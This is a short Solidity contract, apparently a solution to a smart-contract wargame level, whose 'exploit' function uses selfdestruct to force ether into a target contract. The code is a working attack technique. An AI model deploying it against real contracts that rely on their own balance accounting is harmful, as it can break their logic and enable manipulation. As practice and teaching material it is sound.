// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract AttackerForce {
    function exploit(address force) public payable {
        selfdestruct(payable(force));
    }
}
